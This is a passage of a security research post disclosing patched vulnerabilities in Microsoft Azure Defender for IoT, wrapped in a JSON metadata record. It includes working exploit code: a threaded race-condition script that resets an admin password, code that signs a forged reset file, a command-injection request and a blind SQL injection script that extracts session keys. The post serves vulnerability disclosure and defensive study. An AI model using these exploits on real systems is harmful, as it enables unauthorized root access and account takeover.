{
    "id": "2798cc77-f25a-46cd-a386-45ad95b727e6",
    "created_at": "2023-01-12T15:07:35.077919Z",
    "updated_at": "2025-03-27T02:05:25.522143Z",
    "deleted_at": null,
    "sha1_hash": "f43953a8e0565164b9796a17453aeeb1d836557d",
    "title": "2022-03-28 - Pwning Microsoft Azure Defender for IoT - Multiple Flaws Allow Remote Code Execution for All",
    "authors": "",
    "file_creation_date": "2022-05-27T23:16:52Z",
    "file_modification_date": "2022-05-27T23:16:52Z",
    "file_size": 1027344,
    "plain_text": "# Pwning Microsoft Azure Defender for IoT | Multiple Flaws Allow Remote Code Execution for All\n\n**[sentinelone.com/labs/pwning-microsoft-azure-defender-for-iot-multiple-flaws-allow-remote-code-execution-for-all/](https://www.sentinelone.com/labs/pwning-microsoft-azure-defender-for-iot-multiple-flaws-allow-remote-code-execution-for-all/)**\n\nKasif Dekel\n\n**By Kasif Dekel and Ronen Shustin (independent researcher)**\n\n## Executive Summary\n\nSentinelLabs has discovered a number of critical severity flaws in Microsoft Azure’s\nDefender for IoT affecting cloud and on-premise customers.\nUnauthenticated attackers can remotely compromise devices protected by Microsoft\nAzure Defender for IoT by abusing vulnerabilities in Azure’s Password Recovery\nmechanism.\nSentinelLabs’ findings were proactively reported to Microsoft in June 2021 and the\nvulnerabilities are tracked as CVE-2021-42310, CVE-2021-42312, CVE-2021-37222,\nCVE-2021-42313 and CVE-2021-42311 marked as critical, some with CVSS score 9.8.\nMicrosoft has released security updates to address these critical vulnerabilities. Users\nare encouraged to take action immediately.\nAt this time, SentinelLabs has not discovered evidence of in-the-wild abuse.\n\n## Introduction\n\n\n-----\n\nOperational technology (OT) networks power many of the most critical aspects of our\nsociety; however, many of these technologies were not designed with security in mind and\ncan’t be protected with traditional IT security controls. Meanwhile, the Internet of Things (IoT)\nis enabling a new wave of innovation with billions of connected devices, increasing the attack\nsurface and risk.\n\nThe problem has not gone unnoticed by vendors, and many offer security solutions in an\nattempt to address it, but what if the security solution itself introduces vulnerabilities? In this\nreport, we will discuss critical vulnerabilities found in Microsoft Azure Defender for IoT, a\nsecurity product for IoT/OT networks by Microsoft Azure.\n\nFirst, we show how flaws in the password reset mechanism can be abused by remote\nattackers to gain unauthorized access. Then, we discuss multiple SQL injection\nvulnerabilities in Defender for IoT that allow remote attackers to gain access without\nauthentication. Ultimately, our research raises serious questions about the security of\nsecurity products themselves and their overall effect on the security posture of vulnerable\nsectors.\n\n## Microsoft Azure Defender For IoT\n\nMicrosoft Defender for IoT is an agentless network-layer security for continuous IoT/OT\nasset discovery, vulnerability management, and threat detection that does not require\nchanges to existing environments. It can be deployed fully on-premises or in Azureconnected environments.\n\nSource: [Microsoft Azure Defender for IoT architecture](https://docs.microsoft.com/en-us/azure/defender-for-iot/organizations/architecture)\nThis solution consists of two main components:\n\n\n-----\n\n**Microsoft Azure Defender For IoT Management – Enables SOC teams to manage**\nand analyze alerts aggregated from multiple sensors into a single dashboard and\nprovides an overall view of the health of the networks.\n**Microsoft Azure Defender For IoT Sensor – Discovers and continuously monitors**\nnetwork devices. Sensors collect ICS network traffic using passive (agentless)\nmonitoring on IoT and OT devices. Sensors connect to a SPAN port or network TAP\nand immediately begin performing DPI (Deep packet inspection) on IoT and OT\nnetwork traffic.\n\nBoth components can be either installed on a dedicated appliance or on a VM.\n\nDeep packet inspection (DPI) is achieved via the horizon component, which is responsible\nfor analyzing network traffic. The horizon component loads built-in dissectors and can be\nextended to add custom network protocol dissectors.\n\n## Defender for IoT Web Interface Attack Surface\n\nBoth the management and the sensor share roughly the same code base, with configuration\nchanges to fit the purpose of the machine. This is the reason why both machines are\naffected by most of the same vulnerabilities.\n\nThe most appealing attack surface exposed on both machines is the web interface, which\nallows controlling the environment in an easy way. The sensor additionally exposes another\nattack surface which is the DPI service (horizon) that parses the network traffic.\n\nAfter installing and configuring the management and sensors, we are greeted with the login\npage of the web interface.\n\n\n-----\n\nThe same credentials are used also as the login credentials for the SSH server, which gives\nus some more insights into how the system works. The first thing we want to do is obtain the\nsources to see what is happening behind the scenes, so how do we get those?\n\nDefender for IoT is a product formerly known as CyberX, acquired by Microsoft in 2020.\nLooking around in the home directory of the “cyberx” user, we found the installation script\nand a tar archive containing the system’s encrypted files. Reading the script we found the\ncommand that decrypts the archive file. A minified version:\n```\nopenssl enc -d -aes256 -in ./product.tar.gz -md sha512 -k <KEY> | tar xz -C\n<TARGET_DIR>\n\n```\nThe decryption key is shared across all installations.\n\nAfter extracting the data we found the sources for the web interface ( written in Python) and\ngot to work.\n\nWe first aimed to find any exposed unauthenticated APIs and look for vulnerabilities there.\n\n## Finding Potentially Vulnerable Controllers\n\nThe `urls.py file contains the main routes for the web application:`\n\n\n-----\n\n```\nxsense_routes [\n  ['handshake', XSenseHandshakeApiHandler]\n]\nxsense_v17_routes = [\n  ['sync', xsense_v17.XSenseSyncApiHandler]\n]\nupgrade_v1_routes = [\n  ['status', upgrade_v1.RemoteUpgradeStatusApiHandler],\n  ['upgrade-log', upgrade_v1.RemoteUpgradeLogFileApiHandler]\n]\ntoken_v1_routes = [\n  ['verify', token_v1.TokenVerificationHandlers],\n  ['update-handshake', token_v1.UpdateHandshakeHandlers],\n]\nfrontend_routes = [\n  ['alerts', AlertsApiHandler],\n  ['alerts/(?P[0-9]*)', AlertsApiHandler],\n  ['alerts/scenarios', AlertScenariosApiHandler],\n  <redacted>\n]\nmanagement_routs = [\n  ['backup/sync', ManagementApiHandler],\n  ['backup/package', ManagementApiBackupHandler],\n  ['backup/maintenance', MaintenanceApiHandler]\n]\n<redacted>\n\n```\nUsing Jetbrains IntelliJ’s class hierarchy feature we can easily identify route controllers that\ndo not require authentication.\n\n\n-----\n\nRoute\n\ncontrollers that do not require authentication\nEvery controller that inherits from BaseHandler and does not validate authentication or\nrequires a secret token is a good candidate at this point. Some controllers drew our attention\nin particular.\n\n## Understanding Azure’s Password Recovery Mechanism\n\nThe password recovery mechanism for both the management and sensor operates as\nfollows:\n\n1. Access to management/sensor URL (e.g., `https://ip/login#/dashboard )`\n\n\n-----\n\n2. Go to the Password Recovery page.\n\n3. Copy the ApplianceID provided in this page to the Azure console and get a password\n\nreset ZIP file which you upload in the password reset page.\n\n4. Upload the signed ZIP file to the management/sensor Password Recovery page using\n\nthe mentioned form in Step 2. This ZIP contains digitally-signed proof that the user is\nthe owner of this machine, by way of digital certificates and signed data.\n5. A new password is generated and displayed to the user\n\nUnder the hood:\n\n1. The actual process is divided into two requests to the management/sensor server:\n\n1. Upload of the signed ZIP proof\n2 Password recovery\n\n\n-----\n\n2. When a ZIP file is uploaded, it is being extracted to the /var/cyberx/reset_password\n\ndirectory (handled by `ZipFileConfigurationApiHandler ).`\n3. When a password recovery request is being processed, the server performs the\n\nfollowing operations:\n\n1. The `PasswordRecoveryApiHandler controller validates the certificates. This`\n\nvalidates that the certificates are properly signed by a Root CA. in addition, it\nchecks whether these certificates belong to Azure servers.\n2. A request is sent to an internal Tomcat server to further validate the properties of\n\nthe machine.\n3. If all checks pass properly, `PasswordRecoveryApiHandler generates a new`\n\npassword and returns it to the user.\n\nThe ZIP contains the following files:\n\n**IotDefenderSigningCertificate.pem – Azure public key, used to verify the data**\nsignature in `ResetPassword.json, signed by` `issuer.pem .`\n**Issuer.pem – Signs** `IotDefenderSigningCertificate.pem, signed by a trusted`\nroot CA.\n**ResetPassword.json – JSON application data, properties of the machine.**\n\nThe content of the `ResetPassword.json file looks as follows:`\n```\n{\n \"properties\": {\n  \"tenantId\": \"<TENANTID>\",\n  \"subscriptionId\": \"<SUBSCRIPTIONID>\",\n  \"type\": \"PasswordReset\",\n  \"applianceId\": \"<APPLIANCEID>\",\n  \"issuanceDate\": \"<ISSUANCEDATA>\"\n },\n \"signature\": \"<BASE64_SIGNATURE>\"\n}\n\n```\nAccording to Step 2, the code that processes file uploads to the `reset_password directory`\n( components\\xsense-web\\cyberx_web\\api\\admin.py:1508 ) looks as follows:\n\n\n-----\n\n```\nclass ZipFileConfigurationApiHandler(BaseHandler):\n  def _post(self):\n    path = self.request.POST.get('path')\n    approved_path = ['licenses', 'reset_password']\n    if path not in approved_path:\n      raise Exception(\"provided path is not approved\")\n    path = os.path.join('/var/cyberx', path)\n    cyberx_common.clear_directory_content(path)\n     files = self.request.FILES\n    for file_name in files:\n      license_zip = files[file_name]\n      zf = zipfile.ZipFile(license_zip)\n       zf.extractall(path=path)\n\n```\nAs shown, the code extracts the user delivered ZIP to the mentioned directory, and the\nfollowing code handles the password recovery requests (cyberx python library file\n```\ndjango_helpers.py:576 ):\n\n```\n\n-----\n\n```\nclass PasswordRecoveryApiHandler(BaseHandler):\n  def _get(self):\n    global host_id\n    if not host_id:\n      host_id = common.get_system_id()\n      host_id = common.add_dashes(host_id)\n    return {\n      'instanceId': host_id\n    }\n  def _post(self):\n    print 'resetting user password'\n    result = {}\n    try:\n      body = self.parse_body()\n      user = body.get('user')\n      if user != 'cyberx' and user != 'support':\n        raise Exception('Invalid user')\n      try:\n        self._try_reset_password() \n      except Exception as e:\n        logging.error('could not verify activation certificate, error\n{}'.format(e.message))\n        result = {\n          \"internalSystemErrorMessage\": '',\n          \"userDisplayErrorMessage\": 'This password recovery file is\ninvalid.' +\n                         'Download a new file. If this does\nnot work, contact support.'\n        }\n      url = \"http://127.0.0.1:9090/core/api/v1/login/reset-password\"\n      r = requests.post(url=url)\n      r.raise_for_status()\n      # Reset passwords\n      user_new_password = common.generate_password()\n      self._set_user_password(user, user_new_password)\n      if not result:\n        result = {\n          'newPassword': user_new_password\n        }\n    finally:\n      clear_directory_content('/var/cyberx/reset_password')\n    return result\n\n```\nThe function first validates the provided user and calls the function `_try_reset_password :`\n\n\n-----\n\n```\n def _try_reset_password(self):\n    license_signing_certificate_path = os.path.join(RESET_PASSWORD_DIR_PATH,\nSIGNING_CERTIFICATE_FILE_NAME)\n    intermediate_issuer_certificate_path = os.path.join(RESET_PASSWORD_DIR_PATH,\nISSUER_CERTIFICATE_FILE_NAME)\n    cert_data = ssl.verify_certificate(intermediate_issuer_certificate_path,\nlicense_signing_certificate_path)\n    certificate = load_certificate(FILETYPE_PEM, cert_data)\n    print 'validating subject'\n    ssl.verify_subject(certificate)\n    print 'validating issuer'\n    ssl.verify_issuer(certificate)\n\n```\nInternally, this code validates the certificates, including the issuer.\n\nAfterwards, a request to an internal API\n```\nhttp://127.0.0.1:9090/core/api/v1/login/reset-password is made and handled by\n\n```\na Java component that eventually executes the following code:\n\n\n-----\n\n```\npublic class ResetPasswordManager {\n private static final Logger LOGGER =\nLoggerFactory.getLogger(ResetPasswordManager.class);\n private static final String RESET_PASSWORD_CERTIFICATE_PATH =\n\"/var/cyberx/reset_password/IotDefenderSigningCertificate.pem\"; \n private static final String RESET_PASSWORD_JSON_PATH =\n\"/var/cyberx/reset_password/ResetPassword.json\";\n private static final ActivationConfiguration ACTIVATION_CONFIGURATION = new\nActivationConfiguration();\n public static void resetPassword() throws Exception {\n  LOGGER.info(\"Trying to reset password\");\n  JSONObject resetPasswordJson = new\nJSONObject(FileUtils.read(\"/var/cyberx/reset_password/ResetPassword.json\"));\n  ResetPasswordProperties resetPasswordProperties =\n(ResetPasswordProperties)JsonSerializer.fromString(resetPasswordJson\n    .getJSONObject(\"properties\").toString(), ResetPasswordProperties.class);\n  boolean signatureValid =\nCryptographyUtils.isSignatureValid(JsonSerializer.toString(resetPasswordProperties).ge\n resetPasswordJson\n    .getString(\"signature\"),\n\"/var/cyberx/reset_password/IotDefenderSigningCertificate.pem\");\n  if (!signatureValid) {\n   LOGGER.error(\"Signature validation failed\");\n   throw new Exception(\"This signature file is not valid\");\n  } \n  String subscriptionId = resetPasswordProperties.getSubscriptionId();\n  String machineSubscriptionId = ACTIVATION_CONFIGURATION.getSubscriptionId();\n  if (!machineSubscriptionId.equals(\"\") && \n   !machineSubscriptionId.contains(resetPasswordProperties.getSubscriptionId())) {\n   LOGGER.error(\"Subscription ID didn't match\");\n   throw new Exception(\"This signature file is not valid\");\n  } \n  DateTime issuanceDate = \nDateTimeFormat.forPattern(\"MM/dd/yyyy\").parseDateTime(resetPasswordProperties.getIssua\n  if\n(DateTime.now().withTimeAtStartOfDay().minusDays(7).isAfter((ReadableInstant)issuanceD\n {\n   LOGGER.error(\"Password reset file expired\");\n   throw new Exception(\"Password reset file expired\");\n  } \n  if (!Environment.getSensorUUID().replace(\"-\",\n\"\").equals(resetPasswordProperties.getApplianceId().trim().toLowerCase().replace(\"-\",\n\"\"))) {\n   LOGGER.error(\"Appliance id not equal to real uuid\");\n   throw new Exception(\"Appliance id not equal to real uuid\");\n  } \n }\n}\n\n```\nThis code validates the password reset files yet again. This time it also validates the\nsignature of the ResetPassword json file and its properties\n\n\n-----\n\nIf all goes well and the Java API returns 200 OK status code, the\n```\nPasswordRecoveryApiHandler controller proceeds and generates a new password and\n\n```\nreturns it to the user.\n\n## Vulnerabilities in Defender for IOT\n\nAs shown, the password recovery mechanism consists of two main entities:\n\nThe Python web API (external)\nThe Java web API (tomcat, internal)\n\nThis introduces a time-of-check-time-of-use (TOCTOU) vulnerability, since no\nsynchronization mechanism is applied.\n\nAs mentioned, the reset password mechanism starts with a ZIP file upload. This primitive lets\nus upload and extract any files to the `/var/cyberx/reset_password directory.`\n\nThere is a window of opportunity in this flow that makes it possible to change the files in\n```\n/var/cyberx/reset_password between the first verification (Python API) and the second\n\n```\nverification (Java API) in a way that the Python API validates that the files are correctly\nsigned by Azure certificates. Then the Java API processes the replaced specially crafted files\nthat causes it to falsely approve their authenticity and return the 200 OK status code.\n\nThe password recovery Java API contains logical flaws that let specially-crafted payloads\nbypass all verifications.\n\nThe Java API validates the signature of the JSON file (same code as above):\n\n\n-----\n\n```\nJSONObject resetPasswordJson new\nJSONObject(FileUtils.read(\"/var/cyberx/reset_password/ResetPassword.json\"));\n  ResetPasswordProperties resetPasswordProperties =\n(ResetPasswordProperties)JsonSerializer.fromString(resetPasswordJson\n    .getJSONObject(\"properties\").toString(), ResetPasswordProperties.class);\n  boolean signatureValid =\nCryptographyUtils.isSignatureValid(JsonSerializer.toString(resetPasswordProperties).ge\n resetPasswordJson\n    .getString(\"signature\"),\n\"/var/cyberx/reset_password/IotDefenderSigningCertificate.pem\");\n  if (!signatureValid) {\n   LOGGER.error(\"Signature validation failed\");\n   throw new Exception(\"This signature file is not valid\");\n  } \n\n```\nThe issue here is that it doesn’t verify the `IotDefenderSigningCertificate.pem`\ncertificate as opposed to the Python API verification. It only checks that the signature in the\nJSON file is signed by the attached certificate file. This introduces a major flaw.\n\nAn attacker can therefore generate a self-signed certificate and sign the\n```\nResetPassword.json payload that will pass the signature verification.\n\n```\nAs already mentioned, the `ResetPassword.json looks like the following:`\n```\n{\n \"properties\": {\n  \"tenantId\": \"<TENANTID>\",\n  \"subscriptionId\": \"<SUBSCRIPTIONID>\",\n  \"type\": \"PasswordReset\",\n  \"applianceId\": \"<APPLIANCEID>\",\n  \"issuanceDate\": \"<ISSUANCEDATA>\"\n },\n\n```\nAfterwards, there is a subscription ID check:\n```\n String subscriptionId = resetPasswordProperties.getSubscriptionId();\n  String machineSubscriptionId = ACTIVATION_CONFIGURATION.getSubscriptionId();\n  if (!machineSubscriptionId.equals(\"\") && \n   !machineSubscriptionId.contains(resetPasswordProperties.getSubscriptionId())) {\n   LOGGER.error(\"Subscription ID didn't match\");\n   throw new Exception(\"This signature file is not valid\");\n  } \n\n```\nThis is the only property that cannot be obtained by a remote attacker and is infeasible to\nguess in a reasonable time. However, this check can be easily bypassed.\n\nThe code takes the `subscriptionId from the JSON file and compares it to the`\n```\nmachineSubscriptionId . However, the code here is flawed. It checks if\nmachineSubscriptionId contains the subscriptionId from the user controlled JSON file\n\n```\n\n-----\n\nand not the other way around. The use of `.contains() is entirely insecure. The`\n```\nsubscriptionId is in the format of a GUID, which means it must contain a hyphen. This\n\n```\nallows us to bypass this check by only providing a single hyphen character.\n\nNext, the `issuanceDate is checked, followed by` `ApplianceId . This is already supplied`\nto us by the password recovery page (mentioned in Step 2).\n\nNow we understand that we can bypass all of the checks in the Java API, meaning that we\nonly need to successfully win the race condition and ultimately reset the password without\nauthorization.\n\nThe fact that the ZIP upload interface and password recovery interface are divided came in\nhandy in the exploitation phase and lets us win the race more easily.\n\n## Preparing To Attack Azure Defender For IoT\n\nTo prepare the attack we need to do the following.\n\n\n-----\n\n1. Obtain a legitimate password recovery ZIP file from the Azure portal. Obviously, we\n\ncannot access the Azure user that the victim machine belongs to, but we can use any\nAzure user and generate a “dummy” ZIP file. We only need the recovery ZIP file to\nobtain a legitimate certificate. This can be done at the following URL:\n```\n https://portal.azure.com/#blade/Microsoft_Azure_IoT_Defender/IoTDefenderDashboard\n\n```\nFor that matter, we can create a new trial Azure account and generate a recovery file\nusing that interface mentioned above. The secret identifier is irrelevant and may\ncontain garbage.\n\n\n-----\n\n2. Then we need to generate a specially crafted ( bad ) ZIP file. This ZIP file will contain\n\ntwo files:\n```\n      IotDefenderSigningCertificate.pem – a self-signed certificate. It can be\n\n```\ngenerated by the following command:\n```\n      openssl   req -x509  -nodes   -newkey rsa:2048   -keyout key.pem  \n      -out IotDefenderSigningCertificate.pem   -subj\n      \"/C=DE/ST=NRW/L=Berlin/O=My\n      Inc/OU=ALEG/CN=www.example.com/[email protected]\"\n      ResetPassword.json – properties data JSON file, signed by the self-signed\n\n```\ncertificate mentioned above and modified accordingly to bypass the Java API\nverifications.\n\nThis JSON file can be signed using the following Java code:\n```\nimport com.cyberx.infrastructure.common.configuration.ActivationConfiguration;\nimport com.cyberx.infrastructure.common.serializers.JsonSerializer;\nimport com.cyberx.infrastructure.common.utils.CryptographyUtils;\nimport com.cyberx.infrastructure.common.utils.FileUtils;\nimport com.cyberx.infrastructure.models.pojos.ResetPasswordProperties;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.security.GeneralSecurityException;\nimport org.joda.time.DateTime;\nimport org.joda.time.ReadableInstant;\nimport org.joda.time.format.DateTimeFormat;\nimport org.json.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.apache.commons.codec.binary.Base64;\n  public static void sign() {\n    String data = \"{\\\"tenantId\\\":\\\"<redacted>\\\",\\\"subscriptionId\\\":\\\"\\\",\\\"type\\\":\\\"PasswordReset\\\",\\\"applianceId\\\":\\\"\n<redacted>\\\",\\\"issuanceDate\\\":\\\"06/19/2021\\\"}\";\n    try {\n      String signature =\nBase64.encodeBase64String(CryptographyUtils.rsaSign(\"C:\\\\key.pem\", data.getBytes()));\n      JSONObject jsonData = new JSONObject(data);\n      JSONObject completeData = new JSONObject();\n      completeData.put(\"properties\", jsonData);\n      completeData.put(\"signature\", signature);\n      System.out.println(completeData.toString());\n      FileUtils.write(\"C:\\\\ResetPassword.json\", completeData.toString());\n    } catch (GeneralSecurityException e) {\n      e.printStackTrace();\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n```\n\n-----\n\nAs mentioned, the `applianceId is obtained from the password recovery page. The`\n```\ntenantId is not verified, thus can be anything.\n\n```\nThe `issuanceDate parameter is self explanatory.`\n\nOnce generated and signed, it can be added to a ZIP archive and be used by the following\nPython exploit script:\n\n\n-----\n\n```\nimport requests\nimport threading\nimport time\nimport sys\nfrom urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\nHOST = \"192.168.1.130\"\nBENIGN_RESET_PATH = \"./benign.zip\"\nMALICIOUS_RESET_PATH = \"./malicious.zip\"\nBENIGN_DATA = open(BENIGN_RESET_PATH, \"rb+\").read()\nMALICIOUS_DATA = open(MALICIOUS_RESET_PATH, \"rb+\").read()\ndef upload_reset_file(data, timeout=0):\n  headers = {\n    \"X-CSRFTOKEN\": \"aaaa\",\n    \"Referer\": \"https://{0}/login\".format(HOST),\n    \"Origin\": \"https://{0}\".format(HOST)\n  }\n  cookies = {\n    \"csrftoken\": \"aaaa\"\n  }\n  files = {\"file\": data}\n  data = {\"path\": \"reset_password\"}\n  while True:\n    requests.post(\"https://{0}/api/configuration/zip-file\".format(HOST),\ndata=data, files=files, headers=headers, cookies=cookies, verify=False)\n    if not timeout:\n      time.sleep(timeout)\ndef recover_password():\n  headers = {\n    \"X-CSRFTOKEN\": \"aaaa\",\n    \"Referer\": \"https://{0}/login\".format(HOST),\n    \"Origin\": \"https://{0}\".format(HOST)\n  }\n  cookies = {\n    \"csrftoken\": \"aaaa\"\n  }\n  data = {\"user\": \"cyberx\"}\n  while True:\n    req = requests.post(\"https://{0}/api/authentication/recover\".format(HOST),\njson=data, headers=headers, cookies=cookies, verify=False)\n    if b\"newPassword\" in req.content:\n      print(req.content)\n      sys.exit(1)\n\n```\n\n-----\n\n```\ndef main():\n  looper_benign = threading.Thread(target=upload_reset_file, args=(BENIGN_DATA, 0),\ndaemon=True)\n  looper_malicious = threading.Thread(target=upload_reset_file, args=\n(MALICIOUS_DATA, 1), daemon=True)\n  looper_recover = threading.Thread(target=recover_password, args=(), daemon=True)\n  looper_benign.start()\n  looper_malicious.start()\n  looper_recover.start()\n  looper_recover.join()\nif __name__ == '__main__':\n  main()\n\n```\nThe benign.zip file is the ZIP file obtained from the Azure portal, as described above and the\n_malicious.zip file is the mentioned specially-crafted ZIP file as described above._\n\nThe exploit script above performs the TOCTOU attack to reset and receive the password of\nthe cyberx username without authentication at all. It does so by utilizing three threads:\n\n**looper_benign – responsible for uploading the benign ZIP file in an infinite loop**\n**looper_malicious – the same as looper_benign but uploads the malicious ZIP, in this**\nconfiguration with a 1 second timeout\n**looper_recover – sends the password recovery request to trigger the vulnerable code**\n\nSomewhat unfortunately, the documentation mentions that the ZIP file cannot be tampered\nwith.\n\nThis vulnerability is addressed as part of CVE-2021-42310.\n\n## Unauthenticated Remote Code Execution As Root #1\n\n\n-----\n\nAt this point, we can obtain a password for the privileged user cyberx. This allows us to login\nto the SSH server and to execute code as root. Even without this, an attacker could use a\nstealthier approach to execute code.\n\nAfter logging in with the obtained password, the attack surface is vastly increased. For\nexample, we found a simple command injection vulnerability within the change password\nmechanism:\n\nFrom `components\\xsense-web\\cyberx_web\\api\\authentication.py:151 :`\n```\n  def _post(self):\n    try:\n      body = self.parse_body()\n      password = body['password']\n      username = body['username'].lower() # Lower case the username mainly\nbecause it does not matter\n      ip_address = self.get_client_ip_address()\n      # 1. validate credentials:\n      try:\n        logging.info('validate credentials...')\n        user = LoginApiHandler.validate_credentials_and_get_user(username,\npassword, ip_address)\n      except UserFriendlyException as e:\n        raise e\n      except Exception as e:\n        logging.error('User authentication failure', exc_info=True)\n        raise UserFriendlyException('User authentication failure', e.message)\n      # 2. validate new password:\n      new_password = body['new_password']\n      err_message = UserPasswordApiHandler.validate_password(new_password)\n      if err_message:\n        raise UserFriendlyException(\"Password doesn't match security policy\",\nerr_message)\n      # 3. change password:\n      user.set_password(new_password)\n      user.save()\n       process.run('sudo /usr/local/bin/cyberx-users-password-reset -u\n{username} -p {password}'\n            .format(username=user.get_username().encode('utf-8'),\npassword=new_password), hide_output=True)\n      return {'msg': 'Password has been replaced.'}\n    except UserFriendlyException as e:\n      raise e\n    except Exception as e:\n      raise UserFriendlyException(\"Unable to set password.\", e.message)\n\n```\nThe function receives three JSON fields from the user, “username”, “password”,\n“new_password”.\n\n\n-----\n\nFirst, it validates the username and password, which we already have. Next, it only checks\nthe complexity of the password using regex, but does not sanitize the input for command\ninjection primitives.\n\nAfter the validation it executes the `/usr/local/bin/cyberx-users-password-reset`\nscript as root with the username and new password controlled by an attacker. As the function\ndoesn’t sanitize the input of “new_password” properly, we can inject any command we\nchoose. Our command will then be executed as root with the help of `sudo because the`\n**cyberx user is a sudoer. This lets us execute code as a root user:**\n\nThis can be exploited with the following HTTP packet:\n```\nPOST /api/external/authentication/set_password HTTP/1.1\nHost: 192.168.1.130\nUser-Agent: python-requests/2.25.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nX-CSRFTOKEN: aaaa\nReferer: https://192.168.1.130/login\nOrigin: https://192.168.1.130\nCookie: cyberx-version=10.3.1.7-r-55a4f94; csrftoken=aaaa;\nsessionid=kcnjq7wby7c28rxnppcex20gkajej3km; RELOCATE_URL=\nContent-Length: 100\nContent-Type: multipart/form-data; boundary=47dd42bb4cf2abb6e9c4c81019d8fbb4\n{\"username\" : \"cyberx\", \"password\" : \"\",\n\"new_password\": \"``\"}\n\n```\nThis vulnerability is addressed as part of CVE-2021-42312.\n\n## POC\n\n\n-----\n\nWatch Video At:\n\nhttps://youtu.be/_DtthC6A_IQ\n\nIn the remainder of this post, we present two additional routes and new vulnerabilities as well\nas a vulnerability in the traffic processing framework.\n\nThese vulnerabilities are basic SQL Injections (with a twist), yet they have a high impact on\nthe security of the product and the organization’s network.\n\n## CVE-2021-42313\n\nThe `DynamicTokenAuthenticationBaseHandler class inherits from` `BaseHandler and`\ndoes not require authentication. This class contains two functions ( get_version_from_db,\n```\nuuid_is_connected ) which are prone to SQL injection .\n\n```\n\n-----\n\n```\ndef get_version_from_db(self, uuid):\n  version = None\n  with MySQLClient(\"127.0.0.1\", mysql_user, mysql_password, \"management\") as\nclient:\n    logger.info(\"fetching the sensor version from db\")\n    xsenses = client.execute_select_query(\n      \"SELECT id, UID, version FROM xsenses WHERE UID = '{}'\".format(uuid))\n    if len(xsenses) > 0:\n      version = xsenses[0]['version']\n      logger.info(\"sensor version according to db is: {}\".format(version))\n    else:\n      logger.info(\"sensor not in db\")\n  return version\ndef uuid_is_connected(self, uuid):\n  with MySQLClient(\"127.0.0.1\", mysql_user, mysql_password, \"management\") as\nclient:\n    xsenses = client.execute_select_query(\n      \"SELECT id, UID, version FROM xsenses WHERE UID = '{}'\".format(uuid))\n    result = len(xsenses) > 0\n  return result\n\n```\nAs shown, the UUID parameter is not sanitized and formatted into an SQL query. There are a\ncouple of classes which inherit `DynamicTokenAuthenticationBaseHandler . The flow to`\nthe vulnerable functions actually exists in the token validation process.\n\nTherefore, we can trigger the SQL injection without authentication.\n\nThese vulnerabilities can be triggered from:\n\n1. `api/sensors/v1/sync`\n2. `api/v1/upgrade/status`\n3. `api/v1/upgrade/upgrade-log`\n\nIt is worth noting that the function `execute_select_query internally calls to the SQL`\n```\nexecute, API which supports stacked queries. This makes the “simple” select SQL\n\n```\ninjection a more powerful primitive (aka executing any query using `‘;’ ). In our testing we`\nmanaged to insert, update, and execute SQL special commands.\n\nFor the PoC of this vulnerability, we used the `api/sensors/v1/sync API. We created the`\nfollowing script to extract a logged in user session id from the database, which eventually\nallows us to take over the account.\n\n\n-----\n\n```\nimport requests\nimport datetime\nfrom urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\nHOST = \"https://192.168.126.150\"\ndef startAttack():\n  sessionKey = \"\"\n  for currChr in range(1, 40):\n    bitStr = \"\"\n    for currBit in range(0, 8):\n      sql = \"aleg' union select if(ord(substr((SELECT session_key from\ndjango_session WHERE LENGTH(session_data) > 70 ORDER BY expire_date DESC LIMIT 1),\n{0},1)) >>{1} & 1 = 1,sleep(3),0),2,3 -- a\".format(currChr, currBit)\n      body = {\n        \"token\": \"aleg\",\n        \"uid\": sql\n      }\n      now = datetime.datetime.now()\n      res = requests.post(HOST + \"/api/sensors/v1/sync\", json=body,\nverify=False)\n      if (datetime.datetime.now() - now).seconds > 2:\n        bitStr += \"1\"\n        print(1)\n      else:\n        bitStr += \"0\"\n        print(0)\n    final = bitStr[::-1]\n    print(final)\n    print(int(final, 2))\n    chrNum = int(final, 2)\n    if not chrNum:\n      return\n    sessionKey += chr(chrNum)\n    print(\"SessionKey: \" + sessionKey)\ndef main():\n  startAttack()\nif __name__ == \"__main__\":\n  main()\n\n```\nAn example of this script output:\n\n\n-----\n\nAfter extracting the session id from the database, we can log in to the management web\ninterface, at which point there are several methods to execute code as root. For example, we\ncould change the password and login to the SSH server (these users are sudoers), use the\nscript scheduling mechanism, or use the command injection vulnerability we mentioned\nearlier in this post.\n\nThis attack is made easy due to the lack of session validation. There is no further layer of\nvalidation, such as verifying that the session id is used from the same IP address and UserAgent as the initiator of the session.\n\n## CVE-2021-42311\n\nThe `UpdateHandshakeHandlers::is_connected function is also prone to SQL injection.`\n\nThe class `UpdateHandshakeHandler inherits from` `BaseHandler, which is accessible for`\nunauthenticated users and can be reached via the API: `/api/v1/token/update-`\n```\nhandshake .\n\n```\nHowever, this time there is a twist: the `_post function does token verification.`\n\n\n-----\n\n```\nclass UpdateHandshakeHandlers(BaseHandler):\n  def __init__(self):\n    super(UpdateHandshakeHandlers, self).__init__()\n    self.update_secret = update_secret\n  def is_connected(self, sensor_uid):\n    with MySQLClient(\"127.0.0.1\", mysql_user, mysql_password, \"management\") as\nclient:\n      logger.info(\"fetching the sensor version from db\")\n      xsenses = client.execute_select_query(\n        \"SELECT id, UID FROM xsenses WHERE UID = '{}'\".format(sensor_uid))\n      if len(xsenses) > 0:\n        logger.info(\"sensor {} found on db\".format(sensor_uid))\n        return True\n      else:\n        logger.info(\"sensor {} not in db\".format(sensor_uid))\n        return False\n  def _post(self):\n    try:\n      body = self.parse_body()\n    except Exception as ex:\n      return self.generic_handler(self.invalid_body)\n    try:\n      sensor_update_secret = body['update_secret']\n      sensor_uid = body['xsenseUID']\n      if sensor_update_secret != self.update_secret:\n        raise Exception('invalid secret')\n      if not self.is_connected(sensor_uid):\n        raise Exception('only supported with connected sensors')\n    except Exception as ex:\n      logging.exception('failed to fetch new token')\n      return self.generic_handler(self.invalid_token)\n    logger.info(\"update handshake succeeded\")\n    token = {\n      'token': tokens.get_token()\n    }\n    return token\n\n```\nThis means the API requires a secret token, and without it we cannot exploit this SQL\ninjection vulnerability. Fortunately, this API token is not 